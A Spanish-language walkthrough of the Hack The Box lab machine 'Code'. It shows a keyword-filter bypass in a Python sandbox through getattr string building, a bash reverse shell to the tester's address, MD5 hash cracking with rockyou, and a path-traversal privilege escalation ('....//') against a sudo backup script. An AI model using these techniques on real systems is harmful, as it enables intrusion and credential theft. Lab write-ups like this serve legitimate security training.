---
title: Code
date: 2025-12-22 18:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, code ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/55cc3528cd7ad96f67c4f0c715efe286.png
    alt: Hack The Box
---

> Code
Linux · Easy 

## Task 1

How many open TCP ports are listening on Code?

``` shell
┌──(pmartinezr㉿kali)-[~]
└─$ nmap -p- -sCVS -T 5 --min-rate 5000 10.129.231.240
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 17:26 CET
Warning: 10.129.231.240 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.231.240
Host is up (0.049s latency).
Not shown: 65044 closed tcp ports (reset), 489 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Python Code Editor
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.62 seconds
```

> 2

## Task 2

What is the title of the web application running on port 5000?

Si abrimos el navegador en la dirección http://10.129.231.240:5000/ encontramos una aplicación web.
Esta aplicación parece que está pensada para ejecutar código Python, tiene dos botones uno ```run``` y otro ```save```.

Aparte tenemos un menú con información. 

```
Register Login About 
```

El about explica que hace la web

``` html 
About Code

Welcome to Code, your go-to Python code editor! Code is designed to provide a seamless and intuitive experience for writing and running Python code directly in your browser. 
```
El título de la página es ```Python Code Editor``` 

> Python Code Editor


# Task 3

What user is the web app running as?

Lo primero que se nos va a ocurrir es intentar ejecutar algún comando del sistema, si lo conseguimos entonces debería existir un 
RCE y por lo tanto es vulnerable.

``` python
import os
os.system("ls")
print("Hello, world!")
```
Así que lo primero que intenté fue ejecutar un **ls** para ver si se ejecuta. Sin embargo obtienes el siguiente mensaje

```Use of restricted keywords is not allowed.```

Por lo visto esta web es capaz de dtectar ciertas palabras e impedir que se ejecute el código que la contiene. 
Sin embargo para mi esto no es una barrera, pues se bien que podemos hacer código ilegible a primera vista que se ejecute igualmente
Hay varias maneras. En Python podemos jugar con getattr

``` shell
test = getattr(print.__self__,'__imp'+'ort__')('o'+'s')
print(getattr(test, 'sys'+'tem')('whoami'))
```

Después de jugar un buen rato consigo ver que no da error y si un 0, esto confirma la teoría de que efectivametne está ejecutándose, pero necesito alguna prueba.

``` python
test = getattr(print.__self__,'__imp'+'ort__')('o'+'s')
print(getattr(test, 'sys'+'tem')('ping -c 1 10.10.14.110'))
```
Se me ocurrió esta sencilla solución de mandar un ping

``` shell
┌──(pmartinezr㉿kali)-[~/htb/code/sstimap]
└─$ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:22:19.113945 IP 10.129.231.240 > 10.10.14.110: ICMP echo request, id 1, seq 49, length 64
18:22:19.113969 IP 10.10.14.110 > 10.129.231.240: ICMP echo reply, id 1, seq 49, length 64
```
Con ```tcpdump```compruebo que efectivamente esto parece un RCE.
Si tenemos RCE ya solo falta enganchar una shell

``` python
test = getattr(print.__self__,'__imp'+'ort__')('o'+'s')
print(getattr(test, 'sys'+'tem')('bash -c "bash -i >& /dev/tcp/10.10.14.110/4444 0>&1"'))
```
Desde la web insertamos el payload

``` shell
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.14.110:4444 
[*] Command shell session 1 opened (10.10.14.110:4444 -> 10.129.231.240:55994) at 2025-12-22 18:38:13 +0100


Shell Banner:
bash: cannot set terminal process group (1564): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$
-----
          

app-production@code:~/app$ pwd
pwd
/home/app-production/app
app-production@code:~/app$ whoami
whoami
app-production

```
Y con metasploit podemos usar el módulo de multi/handler para sacar una bash shell

> app-production


## Submit the flag located in the app-production user's home directory.

app-production@code:~$ cat user.txt
cat user.txt
fea2fa82c95dd************

> fea2fa82c95dd************
## Task 5 

What is the full path to the web applications's database file?

> /home/app-production/app/instance7databse.db

## Task 6

What is the password for the martin user?

``` shell
app-production@code:~/app/instance$ strings database.db
strings database.db
SQLite format 3
tablecodecode
CREATE TABLE code (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        name VARCHAR(100) NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
7tableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password VARCHAR(80) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
indexsqlite_autoindex_user_1user
Mmartin3de6f30c4a09c27fc71932bfc68474be/
#Mdevelopment759b74ce43947f5f4c91aeddc3e5bad3
martin
#       development
print("Functionality test")Test
```
```strings``` un comando muy útil. 

``` shell
┌──(pmartinezr㉿kali)-[~/htb/code/sstimap]
└─$ hashcat -m 0  "3de6f30c4a09c27fc71932bfc68474be" /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster   
```
La password se encuentra en el diccionario ```rockyou.txt```

> nafeelswordsmaster


## Task 7

What is the full path of the script that martin can run as any user without providing a password?

``` shell
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

## Task 8

Is it possible to backup files outside of /var/ and /home/ using backy.sh?

``` shell
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi


json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

> yes


## Submit the flag located in the root user's home directory.

``` shell
martin@code:~/backups$ cat task2.json 
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/....//root"
  ],
}
```
Por un lado el script se carga las rutas para evitar el transversal path, haciendo uso de gsub, pero si añadimos más de lo necesario solo lo va a realizar una vez por lo que usaremos ```/home/....//root``` así cuando el script nos retire ```../``` seguirá quedando 
```../root```

Hago una copia para trabajar con el archivo json. Para que esto funcione hay que cargarse la parte ```exclude``` pues parece que también interfiere. Aunque solo es una teoría, el caso es que a mi me funcionó no me paré a analizar el por qué.  

``` shell
"exclude": [
                ".*"
        ]
```
Eliminada esta parte del json si parece que funcione y puedo continuar.

``` shell
tar -xf code_home_.._root_2025_December.tar.bz2
```

Luego descomprimimos el archivo que nos genera

```
martin@code:~/backups/root$ cat root.txt 
3385a98471d0844e************
```

> 3385a98471d0844e************

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/653)

Nota: HTB no es perfecto, pueden aparecer pequeños "bug". 